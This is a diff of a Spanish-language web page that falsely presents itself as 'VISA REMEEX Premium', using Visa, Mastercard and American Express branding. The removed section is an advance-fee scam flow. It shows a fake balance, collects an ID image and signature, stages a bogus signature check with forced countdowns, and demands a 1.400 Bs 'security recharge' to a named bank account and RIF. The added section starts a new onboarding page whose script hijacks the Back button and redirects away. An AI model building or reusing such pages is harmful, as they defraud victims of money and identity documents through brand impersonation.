@@ -1,49 +1,38 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <title>Visa Remeex - Retirar Dinero</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta 
-    name="description" 
-    content="Página de Retiro de Dinero - Visa Remeex Premium"
-  />
+  <meta charset="UTF-8">
+  <title>VISA REMEEX Premium - Configuración Inicial</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Selección de Idioma, País, Tipo de Transacción y Términos." />
 
-  <!-- FAVICON opcional -->
-  <link 
-    rel="icon" 
-    href="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" 
-    type="image/png"
-  />
+  <link rel="icon" href="https://w7.pngwing.com/pngs/400/28/png-transparent-credit-card-computer-icons-visa-electron-bank-curio-blue-text-rectangle-thumbnail.png" type="image/png" />
 
-  <!-- Fuentes e íconos -->
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link 
-    href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" 
-    rel="stylesheet"
-  />
-  <link 
-    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" 
-    rel="stylesheet"
-  />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet" />
 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.9.3/html2pdf.bundle.min.js"></script>
   <style>
     :root {
+      /* Paleta de colores y variables globales */
       --primary: #1434CB;
-      --primary-light: #2347E2;
       --secondary: #142C8E;
+      --accent: #00A3FF;
       --success: #10B981;
       --danger: #EF4444;
       --warning: #F59E0B;
-      --background: #EEF2FF;
-      --background-dark: #E0E7FF;
+
+      --background: #F0F4FF;      /* Fondo principal */
       --card-bg: rgba(255, 255, 255, 0.95);
-      --text-primary: #1E293B;
-      --text-secondary: #64748B;
+      --text-primary: #1E293B;      /* Texto principal */
+      --text-secondary: #64748B;    /* Texto secundario */
+
       --border-radius-lg: 24px;
       --border-radius: 16px;
       --border-radius-sm: 12px;
-      --transition: all 0.4s ease;
+      --transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
       --shadow-sm: 0 4px 6px -1px rgb(0 0 0 / 0.1);
       --shadow: 0 10px 15px -3px rgb(0 0 0 / 0.1);
       --shadow-lg: 0 20px 25px -5px rgb(0 0 0 / 0.1);
@@ -53,122 +42,162 @@
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: 'Plus Jakarta Sans', sans-serif;
     }
 
     body {
       min-height: 100vh;
-      background: linear-gradient(135deg, var(--background) 0%, var(--background-dark) 100%);
+      background: linear-gradient(135deg, #EEF2FF 0%, #E0E7FF 100%);
+      font-family: 'Plus Jakarta Sans', sans-serif;
       color: var(--text-primary);
-      line-height: 1.5;
-      overflow-x: hidden;
+      line-height: 1.6;
     }
 
     /* Contenedor principal */
     .container {
       max-width: 600px;
-      margin: 0 auto;
+      margin: 2rem auto;
       padding: 1rem;
-    }
-
-    /* Top bar (logo + usuario) */
-    .top-bar {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 1rem;
-    }
-    .top-bar img {
-      height: 36px;
-      object-fit: contain;
-    }
-    .user-profile {
-      font-weight: 600;
-      font-size: 1rem;
-      color: var(--text-primary);
-    }
-
-    /* Barra de búsqueda (opcional) */
-    .search-bar {
-      position: relative;
-      margin-bottom: 1.5rem;
-    }
-    .search-bar input {
-      width: 100%;
-      padding: 1rem 1rem 1rem 3rem;
-      border: none;
-      border-radius: var(--border-radius);
       background: var(--card-bg);
-      box-shadow: var(--shadow-sm);
-      outline: none;
-      font-size: 1rem;
-    }
-    .search-bar i {
-      position: absolute;
-      left: 1rem;
-      top: 50%;
-      transform: translateY(-50%);
-      color: var(--text-secondary);
-    }
-
-    /* Tarjeta de Saldo disponible */
-    .card {
-      background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
-      color: white;
       border-radius: var(--border-radius-lg);
-      padding: 2rem;
       box-shadow: var(--shadow);
-      margin-bottom: 2rem;
+      backdrop-filter: blur(10px);
+      overflow: hidden;
       transition: var(--transition);
     }
-    .card:hover {
-      transform: translateY(-3px);
+
+    .container:hover {
+      transform: translateY(-1px);
       box-shadow: var(--shadow-lg);
     }
-    .balance-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
+
+    /* HEADER (titulo y descripción) */
+    .header {
+      text-align: center;
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      color: #fff;
+      padding: 2rem 1rem;
+      border-bottom-left-radius: var(--border-radius-lg);
+      border-bottom-right-radius: var(--border-radius-lg);
+      margin-bottom: 1rem;
+      position: relative;
+    }
+    .header h1 {
+      font-size: 1.8rem;
+      font-weight: 700;
       margin-bottom: 1rem;
     }
-    .balance-amount {
-      font-size: 2rem;
-      font-weight: 700;
-      margin: 0.5rem 0 1rem 0;
-      letter-spacing: -1px;
-    }
-    .card-number {
+    .header p {
       font-size: 1rem;
-      letter-spacing: 2px;
-      opacity: 0.9;
+      line-height: 1.4;
+      max-width: 500px;
+      margin: 0 auto;
     }
 
-    /* Tarjetas (misma apariencia) */
-    .visa-card {
+    /* Logo Bar */
+    .logo-bar {
       background: var(--card-bg);
-      border-radius: var(--border-radius-lg);
-      padding: 1.5rem;
-      box-shadow: var(--shadow);
-      backdrop-filter: blur(8px);
-      margin-bottom: 2rem;
-      display: none; /* Se mostrarán dinámicamente */
+      backdrop-filter: blur(10px);
+      padding: 1rem 0.5rem;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 2rem;
+      border-bottom: 1px solid rgba(0,0,0,0.05);
+      margin-bottom: 1rem;
     }
-    .visa-card.active {
+    .logo-bar img {
+      height: 32px;
+      filter: grayscale(30%);
+      opacity: 0.8;
+      transition: var(--transition);
+    }
+    .logo-bar img:hover {
+      filter: none;
+      opacity: 1;
+      transform: scale(1.05);
+    }
+
+    /* Barra de progreso */
+    .progress-bar {
+      height: 8px;
+      background-color: #e0e0e0;
+      border-radius: var(--border-radius);
+      margin-bottom: 2rem;
+      overflow: hidden;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      background-color: var(--primary);
+      width: 0%;
+      transition: width 0.5s ease-in-out;
+    }
+
+    /* Secciones */
+    .section-content {
+      padding: 1rem;
+      display: none; /* Inicialmente ocultas */
+    }
+
+    .section-content.active {
       display: block;
     }
-    .visa-card h2 {
+
+    .section-content h2 {
       margin-bottom: 1rem;
-      color: var(--primary);
       font-size: 1.2rem;
       display: flex;
       align-items: center;
       gap: 0.5rem;
+      color: var(--primary);
     }
-    .visa-card p {
-      margin-bottom: 1rem;
+    .section-content h2 i {
+      color: var(--primary);
+      font-size: 1.2rem;
+    }
+
+    /* Formulario */
+    .form-group {
+      margin-bottom: 1.5rem;
+    }
+    .form-label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 600;
       color: var(--text-secondary);
-      font-size: 1rem;
-      line-height: 1.5;
+      font-size: 0.9rem;
+    }
+    .form-control {
+      width: 100%;
+      padding: 0.75rem 1rem;
+      border: 2px solid rgba(0,0,0,0.05);
+      border-radius: var(--border-radius-sm);
+      font-size: 0.95rem;
+      background: #fff;
+      transition: var(--transition);
+    }
+    .form-control:hover {
+      border-color: rgba(0,0,0,0.1);
+    }
+    .form-control:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 4px rgba(20,52,203,0.1);
+    }
+
+    /* Checkbox */
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      margin-top: 1rem;
+    }
+    .checkbox-group a {
+      color: var(--accent);
+      text-decoration: none;
+    }
+    .checkbox-group a:hover {
+      text-decoration: underline;
     }
 
     /* Botones */
@@ -176,930 +205,323 @@
       display: inline-flex;
       align-items: center;
       justify-content: center;
-      gap: 0.4rem;
-      padding: 0.75rem 1.2rem;
+      gap: 0.5rem;
+      padding: 0.75rem 1.5rem;
       border-radius: var(--border-radius-sm);
       font-weight: 600;
       font-size: 0.95rem;
       transition: var(--transition);
       border: none;
       cursor: pointer;
-    }
-    .btn:hover {
-      transform: translateY(-2px);
-      box-shadow: var(--shadow-sm);
     }
     .btn-primary {
-      background: var(--primary);
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
       color: #fff;
-    }
-    .btn-secondary {
-      background: var(--secondary);
-      color: #fff;
-    }
-    .btn-outline {
-      background: transparent;
-      color: var(--primary);
-      border: 2px solid var(--primary);
-    }
-    .btn-outline:hover {
-      background: rgba(20, 52, 203, 0.05);
-    }
-    .btn-danger {
-      background: var(--danger);
-      color: #fff;
-    }
-    .btn-success {
-      background: var(--success);
-      color: #fff;
-    }
-    .btn-disabled {
-      background: var(--secondary);
-      opacity: 0.6;
-      cursor: not-allowed;
-    }
-
-    /* Listados con íconos */
-    .icon-list {
-      margin: 1rem 0;
-      text-align: left;
-    }
-    .icon-list li {
-      margin-bottom: 0.8rem;
-      display: flex;
-      align-items: flex-start;
-      gap: 0.5rem;
-      font-size: 1rem;
-    }
-    .icon-list li i {
-      color: var(--primary);
-      font-size: 1.1rem;
-      margin-top: 2px;
-    }
-
-    /* Data-summary */
-    .data-summary {
-      margin-top: 1rem;
-      border: 1px solid rgba(0,0,0,0.1);
-      border-radius: var(--border-radius-sm);
-      padding: 1rem;
-      background: #fff;
-      color: var(--text-primary);
-      margin-bottom: 1rem;
-    }
-    .data-summary h3 {
-      font-size: 1rem;
-      font-weight: 600;
-      margin-bottom: 0.5rem;
-    }
-    .data-item {
-      margin-bottom: 0.5rem;
-      font-size: 1rem;
-    }
-
-    /* Upload documento */
-    .preview-container {
-      border: 1px dashed var(--primary);
-      padding: 1rem;
-      border-radius: var(--border-radius-sm);
-      margin-bottom: 1rem;
-      display: none;
-      position: relative;
-      text-align: center;
-      background-color: #fff;
-    }
-    .preview-container.active {
-      display: block;
-    }
-    .preview-container img {
-      max-width: 100%;
-      border-radius: var(--border-radius-sm);
-    }
-
-    /* Canvas de firma */
-    .signature-canvas {
-      border: 2px dashed var(--primary);
-      border-radius: var(--border-radius-sm);
-      width: 100%;
-      height: 220px;
-      background: #fff;
-      margin-bottom: 1rem;
-      position: relative;
-    }
-
-    /* Overlays */
-    .overlay {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.5);
-      display: none;
-      justify-content: center;
-      align-items: center;
-      z-index: 999;
-      padding: 1rem;
-    }
-    .overlay.active {
-      display: flex;
-    }
-    .modal {
-      background: #fff;
-      border-radius: var(--border-radius-lg);
-      padding: 1.5rem;
-      width: 90%;
-      max-width: 420px;
-      box-shadow: var(--shadow-lg);
-      text-align: center;
-      position: relative;
-    }
-    .modal h3 {
-      font-size: 1.2rem;
-      margin-bottom: 0.5rem;
-      color: var(--primary);
-    }
-    .modal p {
-      font-size: 1rem;
-      color: var(--text-secondary);
-      margin-bottom: 1rem;
-      line-height: 1.4;
-    }
-
-    /* Cuenta regresiva */
-    .countdown {
-      font-size: 0.95rem;
-      color: var(--text-secondary);
-      margin-top: 0.5rem;
-    }
-
-    /* Tarjeta de datos bancarios de seguridad */
-    .security-data-card {
-      background: #fff;
-      border: 1px dashed var(--primary);
-      border-radius: var(--border-radius-sm);
-      padding: 1rem;
-      margin-top: 1rem;
-    }
-    .security-data-card p {
-      font-size: 1rem;
-      margin-bottom: 0.5rem;
-      line-height: 1.4;
-    }
-
-    /* Botón soporte */
-    .btn-support {
-      background: var(--primary);
-      color: #fff;
-      padding: 0.75rem 1.2rem;
-      border-radius: var(--border-radius-sm);
-      font-weight: 600;
-      border: none;
-      font-size: 1rem;
-      cursor: pointer;
-      transition: var(--transition);
-    }
-    .btn-support:hover {
-      transform: translateY(-2px);
       box-shadow: var(--shadow-sm);
     }
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: var(--shadow);
+    }
 
+    /* Ajustes responsive */
     @media (max-width: 768px) {
-      .balance-amount {
-        font-size: 1.7rem;
+      .header {
+        padding: 1.5rem 1rem;
       }
-      .visa-card h2 {
-        font-size: 1.1rem;
-      }
-      .modal h3 {
-        font-size: 1.05rem;
+      .header h1 {
+        font-size: 1.6rem;
       }
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <!-- Barra superior (logo y nombre de usuario) -->
-    <div class="top-bar">
-      <img 
-        src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" 
-        alt="Visa Logo"
-      />
-      <div class="user-profile" id="userName">Juan Carlos</div>
-    </div>
 
-    <!-- Barra de búsqueda (opcional) -->
-    <div class="search-bar">
-      <i class="fas fa-search"></i>
-      <input type="text" placeholder="Buscar..." />
-    </div>
-
-    <!-- Tarjeta con Saldo disponible -->
-    <div class="card">
-      <div class="balance-header">
-        <h2>Saldo disponible</h2>
-        <i class="fas fa-ellipsis-h"></i>
-      </div>
-      <div class="balance-amount" id="balanceAmount">69.000,00 Bs</div>
-      <div class="card-number">**** **** **** 3009</div>
-    </div>
-
-    <!-- Sección principal: Datos (tarjeta) -->
-    <div class="visa-card active" id="datosRetiroSection">
-      <h2><i class="fas fa-hand-holding-usd"></i> Retirar a mi banco</h2>
+    <div class="header">
+      <h1>VISA REMEEX Premium</h1>
       <p>
-        Verifica la información de tu beneficiario y tus datos bancarios. 
-        Si algo está incorrecto, por favor edítalo antes de continuar.
+        Gracias a la tecnología VISA, puedes enviar dinero
+        de forma instantánea a una cuenta bancaria sin comisiones,
+        con la mejor tasa de cambio y la rapidez que necesitas.
       </p>
+    </div>
 
-      <div class="data-summary">
-        <h3>Datos del Beneficiario</h3>
-        <div class="data-item" id="benefName">Nombre: <strong>Juan Pérez</strong></div>
-        <div class="data-item" id="benefDoc">Documento: <strong>V-12345678</strong></div>
-        <div class="data-item" id="benefBirth">F. Nac: <strong>1985-06-10</strong></div>
-      </div>
+    <div class="logo-bar">
+      <img src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" alt="Visa Logo">
+      <img src="https://www.mastercard.es/content/dam/public/mastercardcom/es/favicon/mc-logo-52.svg" alt="MasterCard Logo">
+      <img src="https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.8.0/package/dist/img/logos/dls-logo-stack.svg" alt="American Express Logo">
+    </div>
 
-      <div class="data-summary">
-        <h3>Datos Bancarios</h3>
-        <div class="data-item" id="bankName">Banco: <strong>Banco Nacional</strong></div>
-        <div class="data-item" id="bankAccount">N° de Cuenta: <strong>0123-4567-89-0123456789</strong></div>
-        <div class="data-item" id="bankType">Tipo: <strong>Cuenta Corriente</strong></div>
-      </div>
+    <div class="progress-bar">
+      <div class="progress-bar-fill" id="progressBarFill"></div>
+    </div>
 
-      <div style="display:flex; gap:1rem; justify-content:flex-end;">
-        <button class="btn btn-outline" id="editBtn">
-          <i class="fas fa-edit"></i> Editar
-        </button>
-        <button class="btn btn-primary" id="confirmInfoBtn">
-          <i class="fas fa-check-circle"></i> Confirmar
-        </button>
+    <div class="section-content active" id="step1">
+      <h2><i class="fas fa-language"></i> Selecciona tu idioma</h2>
+      <div class="form-group">
+        <label class="form-label" for="language">Idioma</label>
+        <select class="form-control" id="language">
+          <option value="">-- Elige un idioma --</option>
+          <option value="es">Español</option>
+          <option value="en">English</option>
+          <option value="fr">Français</option>
+          <option value="de">Deutsch</option>
+          <option value="pt">Português</option>
+          <option value="zh">中文</option>
+        </select>
       </div>
     </div>
 
-    <!-- Tarjeta para subir Documento de Identidad -->
-    <div class="visa-card" id="uploadSection">
-      <h2><i class="fas fa-file-upload"></i> Documento de Identidad</h2>
-      <p>
-        Carga tu documento de identidad (solo imágenes). Debe ser vigente, 
-        legible y visible la firma y demás datos.
-      </p>
-      <label for="idDocument">Seleccionar archivo (solo imágenes)</label>
-      <input type="file" id="idDocument" accept="image/*" />
+    <div class="section-content" id="step2">
+      <h2><i class="fas fa-globe-americas"></i> Selecciona el país donde enviarás tu dinero</h2>
+      <div class="form-group">
+        <label class="form-label" for="country">País Destino</label>
+        <select class="form-control" id="country">
+          <option value="">-- Selecciona un país --</option>
+          <option value="Alemania">Alemania</option>
+          <option value="Andorra">Andorra</option>
+          <option value="Antigua y Barbuda">Antigua y Barbuda</option>
+          <option value="Argentina">Argentina</option>
+          <option value="Austria">Austria</option>
+          <option value="Bahamas">Bahamas</option>
+          <option value="Barbados">Barbados</option>
+          <option value="Bélgica">Bélgica</option>
+          <option value="Belice">Belice</option>
+          <option value="Bielorrusia">Bielorrusia</option>
+          <option value="Bolivia">Bolivia</option>
+          <option value="Bosnia y Herzegovina">Bosnia y Herzegovina</option>
+          <option value="Brasil">Brasil</option>
+          <option value="Bulgaria">Bulgaria</option>
+          <option value="Canadá">Canadá</option>
+          <option value="Chile">Chile</option>
+          <option value="Chipre">Chipre</option>
+          <option value="Colombia">Colombia</option>
+          <option value="Costa Rica">Costa Rica</option>
+          <option value="Croacia">Croacia</option>
+          <option value="Cuba">Cuba</option>
+          <option value="Dinamarca">Dinamarca</option>
+          <option value="Dominica">Dominica</option>
+          <option value="Ecuador">Ecuador</option>
+          <option value="El Salvador">El Salvador</option>
+          <option value="Eslovaquia">Eslovaquia</option>
+          <option value="Eslovenia">Eslovenia</option>
+          <option value="España">España</option>
+          <option value="Estados Unidos">Estados Unidos</option>
+          <option value="Estonia">Estonia</option>
+          <option value="Finlandia">Finlandia</option>
+          <option value="Francia">Francia</option>
+          <option value="Granada">Granada</option>
+          <option value="Grecia">Grecia</option>
+          <option value="Guatemala">Guatemala</option>
+          <option value="Guyana">Guyana</option>
+          <option value="Haití">Haití</option>
+          <option value="Honduras">Honduras</option>
+          <option value="Hungría">Hungría</option>
+          <option value="Irlanda">Irlanda</option>
+          <option value="Islandia">Islandia</option>
+          <option value="Italia">Italia</option>
+          <option value="Jamaica">Jamaica</option>
+          <option value="Letonia">Letonia</option>
+          <option value="Liechtenstein">Liechtenstein</option>
+          <option value="Lituania">Lituania</option>
+          <option value="Luxemburgo">Luxemburgo</option>
+          <option value="Malta">Malta</option>
+          <option value="México">México</option>
+          <option value="Moldavia">Moldavia</option>
+          <option value="Mónaco">Mónaco</option>
+          <option value="Montenegro">Montenegro</option>
+          <option value="Nicaragua">Nicaragua</option>
+          <option value="Noruega">Noruega</option>
+          <option value="Panamá">Panamá</option>
+          <option value="Paraguay">Paraguay</option>
+          <option value="Países Bajos">Países Bajos</option>
+          <option value="Perú">Perú</option>
+          <option value="Polonia">Polonia</option>
+          <option value="Portugal">Portugal</option>
+          <option value="Reino Unido">Reino Unido</option>
+          <option value="República Checa">República Checa</option>
+          <option value="República Dominicana">República Dominicana</option>
+          <option value="Rumanía">Rumanía</option>
+          <option value="Rusia">Rusia</option>
+          <option value="San Marino">San Marino</option>
+          <option value="San Cristóbal y Nieves">San Cristóbal y Nieves</option>
+          <option value="San Vicente y Granadinas">San Vicente y las Granadinas</option>
+          <option value="Santa Lucía">Santa Lucía</option>
+          <option value="Serbia">Serbia</option>
+          <option value="Suecia">Suecia</option>
+          <option value="Suiza">Suiza</option>
+          <option value="Surinam">Surinam</option>
+          <option value="Trinidad y Tobago">Trinidad y Tobago</option>
+          <option value="Turquía">Turquía</option>
+          <option value="Ucrania">Ucrania</option>
+          <option value="Uruguay">Uruguay</option>
+          <option value="Venezuela">Venezuela</option>
+          <option value="Ciudad del Vaticano">Ciudad del Vaticano</option>
+        </select></div>
+    </div>
 
-      <div class="preview-container" id="previewContainer">
-        <img id="docPreview" src="#" alt="Vista Previa" />
-        <div style="margin-top:1rem; color: var(--text-secondary); font-size:0.95rem;">
-          <strong>Requisitos:</strong>
-          <ul style="padding-left: 20px; margin-top: 5px;">
-            <li>Documento vigente</li>
-            <li>Imagen legible</li>
-            <li>Firma y datos visibles</li>
-          </ul>
-        </div>
-      </div>
-
-      <div style="text-align:right;">
-        <button class="btn btn-success" id="confirmDocBtn" style="display:none;">
-          <i class="fas fa-check"></i> Confirmar Documento
-        </button>
+    <div class="section-content" id="step3">
+      <h2><i class="fas fa-exchange-alt"></i> Tipo de Transacción</h2>
+      <div class="form-group">
+        <label class="form-label" for="transactionType">Elige el tipo</label>
+        <select class="form-control" id="transactionType">
+          <option value="">-- Selecciona --</option>
+        </select>
       </div>
     </div>
 
-    <!-- Tarjeta para Firma -->
-    <div class="visa-card" id="signatureSection">
-      <h2><i class="fas fa-file-signature"></i> Firma de Autorización</h2>
-      <p>
-        Firme en el recuadro para autorizar el retiro. 
-        La firma debe coincidir con la de su documento.
-      </p>
-
-      <canvas class="signature-canvas" id="signatureCanvas"></canvas>
-      <button class="btn btn-danger" id="clearSignatureBtn">
-        <i class="fas fa-eraser"></i> Limpiar Firma
-      </button>
-
-      <div style="text-align:right;">
-        <button class="btn btn-success" id="saveSignatureBtn">
-          <i class="fas fa-save"></i> Guardar Firma
-        </button>
+    <div class="section-content" id="step4">
+      <h2><i class="fas fa-file-contract"></i> Aceptar Términos y Condiciones</h2>
+      <div class="checkbox-group">
+        <input type="checkbox" id="acceptVisa" />
+        <label for="acceptVisa">
+          Acepto los
+          <a href="https://www.visa.es/terminos-de-uso.html" target="_blank">
+            Términos y Condiciones de Visa
+          </a>
+        </label>
       </div>
-    </div>
 
-    <!-- Tarjeta de Verificación 1 (bajo el saldo, no bajo la firma) -->
-    <div class="visa-card" id="securityVerification1">
-      <h2><i class="fas fa-shield-alt"></i> Verificación de Seguridad</h2>
-      <p id="securityVerificationText">
-        Estimado(a) <span id="fullUserName">Juan Pérez</span>, 
-        recibirás <strong id="montoEnBs">69.000,00</strong> Bs 
-        (<strong id="montoEnUsd">1000</strong> USD) en tu cuenta
-        <span id="bankAccountNumber">0123-4567-89-0123456789</span>.
-        Dado el monto elevado, tu banco solicita un proceso de seguridad adicional.
-      </p>
-      <div style="text-align:right;">
-        <button class="btn btn-primary btn-disabled" id="continueSecurityBtn1" disabled>
+      <div style="display:flex; justify-content:flex-end; margin-top:1.5rem;">
+        <button class="btn btn-primary" id="continueBtn">
           Continuar
         </button>
-        <div class="countdown" id="countdownSecurity1"></div>
-      </div>
-    </div>
-
-    <!-- Tarjeta de Verificación 2 -->
-    <div class="visa-card" id="securityVerification2">
-      <h2><i class="fas fa-question-circle"></i> ¿Por qué esta verificación?</h2>
-      <ul class="icon-list">
-        <li><i class="fas fa-user-shield"></i> Evitar suplantación de identidad</li>
-        <li><i class="fas fa-lock"></i> Proteger tu cuenta de accesos no autorizados</li>
-        <li><i class="fas fa-ban"></i> Prevenir bloqueos o retenciones en tu banco</li>
-        <li><i class="fas fa-gavel"></i> Cumplir con normas legales de seguridad</li>
-      </ul>
-      <div style="text-align:right;">
-        <button class="btn btn-primary btn-disabled" id="continueSecurityBtn2" disabled>
-          Entendido, Continuar
-        </button>
-        <div class="countdown" id="countdownSecurity2"></div>
-      </div>
-    </div>
-
-    <!-- Tarjeta de Verificación 3 -->
-    <div class="visa-card" id="securityVerification3">
-      <h2><i class="fas fa-user-check"></i> ¿Qué necesitas hacer?</h2>
-      <p>
-        Debes realizar una recarga de seguridad por <strong>1.400,00 Bs</strong> 
-        desde la misma cuenta donde recibirás tu depósito final. 
-        Esta recarga es reembolsable y se te devolverá de inmediato 
-        junto a tus fondos.
-      </p>
-      <div class="security-data-card">
-        <p><strong>Banco:</strong> Banco Venezolano de Crédito (0104)</p>
-        <p><strong>Número:</strong> 0412-1000000</p>
-        <p><strong>RIF:</strong> J-407502646</p>
-        <p><strong>Monto:</strong> 1.400,00 Bolívares</p>
-        <p><strong>Concepto:</strong> <span id="conceptRecarga">JuanPérezV12345678</span></p>
-      </div>
-      <div style="text-align:right; margin-top:1rem;">
-        <button class="btn btn-primary btn-disabled" id="recargaReadyBtn" disabled>
-          Una vez realices tu recarga, presiona aquí
-        </button>
-        <div class="countdown" id="countdownRecargaReady"></div>
-      </div>
-    </div>
-
-    <!-- Tarjeta para Completar Datos de Recarga -->
-    <div class="visa-card" id="recargaSection">
-      <h2><i class="fas fa-credit-card"></i> Completar Datos de tu Recarga</h2>
-      <p>
-        Has realizado una recarga de seguridad por <strong>1.400,00 Bs</strong>. 
-        Por favor completa la información para validar tu pago.
-      </p>
-      <label>Banco Origen:</label>
-      <input type="text" id="recargaBancoOrigen" value="Banco Nacional" disabled />
-      
-      <label>Teléfono:</label>
-      <input type="text" id="recargaTelefono" value="0412-1234567" disabled />
-
-      <label>Cédula:</label>
-      <input type="text" id="recargaCedula" value="V-12345678" disabled />
-
-      <label>Monto (Bs):</label>
-      <input type="text" id="recargaMonto" value="1.400,00" disabled />
-
-      <p style="font-size:1rem; color: var(--text-secondary); margin-bottom:1rem;">
-        Al realizar esta recarga de 1.400,00 Bs, se te devolverá junto con 
-        <strong id="montoRetiroBs">69.000,00</strong>. Tu depósito total será de 
-        <strong id="montoDepositoTotal">70.400,00</strong> Bs.
-      </p>
-
-      <label>N° de Comprobante (12 dígitos):</label>
-      <input type="text" id="comprobanteInput" placeholder="Ej: 511580050120" />
-
-      <div style="text-align:right;">
-        <button class="btn btn-success btn-disabled" id="confirmRecargaBtn" disabled>
-          <i class="fas fa-check"></i> Confirmar Recarga
-        </button>
-        <div class="countdown" id="countdownRecargaConfirm"></div>
       </div>
     </div>
   </div>
-
-  <!-- Overlay: Análisis de Firma -->
-  <div class="overlay" id="overlayAnalizandoFirma">
-    <div class="modal">
-      <h3>Analizando su Firma...</h3>
-      <p>Por favor, espera mientras verificamos la coincidencia.</p>
-      <i class="fas fa-spinner fa-spin" style="font-size:1.5rem; color:var(--primary);"></i>
-    </div>
-  </div>
-
-  <!-- Overlay: Aviso de Firma no coincide -->
-  <div class="overlay" id="overlayFirmaNoCoincide">
-    <div class="modal">
-      <h3>La firma no coincide</h3>
-      <p>
-        Tu firma no coincide con la de tu documento de identidad.
-        Se recomienda firmar nuevamente o continuar bajo tu riesgo.
-      </p>
-      <div style="display:flex; gap:1rem; justify-content:center; flex-wrap:wrap;">
-        <button class="btn btn-danger" id="retrySignatureBtn">
-          <i class="fas fa-undo"></i> Volver a Firmar
-        </button>
-        <button class="btn btn-primary" id="forceContinueBtn">
-          <i class="fas fa-forward"></i> Continuar
-        </button>
-      </div>
-    </div>
-  </div>
-
-  <!-- Overlay: Mensajes secuenciales (post-firma) -->
-  <div class="overlay" id="overlayMensajesSecuencia">
-    <div class="modal">
-      <h3 id="mensajeSecuenciaTitulo">Validando...</h3>
-      <p id="mensajeSecuenciaTexto"></p>
-      <i class="fas fa-spinner fa-spin" style="font-size:1.5rem; color:var(--primary);"></i>
-    </div>
-  </div>
-
-  <!-- Overlay: Confirmación de Recarga -->
-  <div class="overlay" id="overlayConfirmRecarga">
-    <div class="modal">
-      <h3>Confirmación de Recarga</h3>
-      <p>
-        Has realizado tu recarga de seguridad por <strong>1.400,00 Bs</strong> a los siguientes datos:
-      </p>
-      <p style="text-align:left; font-size:1rem;">
-        <strong>Banco:</strong> Banco Venezolano de Crédito (0104)<br/>
-        <strong>Número:</strong> 0412-1000000<br/>
-        <strong>RIF:</strong> J-407502646<br/>
-        <strong>Monto:</strong> 1.400,00 Bs<br/>
-        <strong>Concepto:</strong> <span id="overlayConceptRecarga"></span>
-      </p>
-      <div style="text-align:right;">
-        <button class="btn btn-primary btn-disabled" id="confirmRecargaOverlayBtn" disabled>
-          Confirmar
-        </button>
-        <div class="countdown" id="countdownOverlayConfirm"></div>
-      </div>
-    </div>
-  </div>
-
-  <!-- Overlay: Mensajes Finales (verificación recarga) -->
-  <div class="overlay" id="overlayMensajesFinales">
-    <div class="modal">
-      <h3 id="mensajeFinalTitulo"></h3>
-      <p id="mensajeFinalTexto"></p>
-      <i class="fas fa-spinner fa-spin" style="font-size:1.5rem; color:var(--primary);"></i>
-    </div>
-  </div>
-
-  <!-- Overlay: Error Final -->
-  <div class="overlay" id="overlayErrorFinal">
-    <div class="modal">
-      <h3>No se encontró tu recarga de seguridad</h3>
-      <p>
-        No se localizó tu recarga de seguridad por 1.400,00 Bs.
-        Debes contactar a Soporte para resolver este inconveniente.
-      </p>
-      <a 
-        href="#" 
-        target="_blank"
-        class="btn-support"
-        id="whatsappLink"
-      >
-        Contactar a Soporte
-      </a>
-    </div>
-  </div>
-
   <script>
-    /************************************************************************
-     *                     VARIABLES DE EJEMPLO / DATOS
-     ************************************************************************/
-    let currentBalanceBS = 69000;         // Saldo disponible
-    let userName = "Juan Carlos";         // Nombre visible en top-bar
-    let beneficiaryName = "Juan Pérez";   // Nombre beneficiario
-    let beneficiaryDoc = "V-12345678";    // Doc beneficiario
-    let beneficiaryBirth = "1985-06-10";
-    let bankNameValue = "Banco Nacional";
-    let bankAccountValue = "0123-4567-89-0123456789";
-    let bankTypeValue = "Cuenta Corriente";
-    let montoRetiroUsuarioBs = 69000;
-    let montoRetiroUsuarioUsd = 1000;
-    let recargaSeguridadBs = 1400;
+    let isRedirecting = false; // Bandera para indicar redirección
 
-    // Para almacenar la firma
-    let savedSignature = null;
+    // Redirigir si el usuario presiona Atrás:
+    history.pushState({}, '', '');
+    window.addEventListener('popstate', function(event) {
+      window.location.href = "https://remeexvisa.com";
+    });
 
-    /************************************************************************
-     *                            ELEMENTOS DOM
-     ************************************************************************/
-    // Saldo / top
-    const balanceAmountElem = document.getElementById("balanceAmount");
-    const userNameElem = document.getElementById("userName");
-    // Datos
-    const benefNameElem = document.getElementById("benefName");
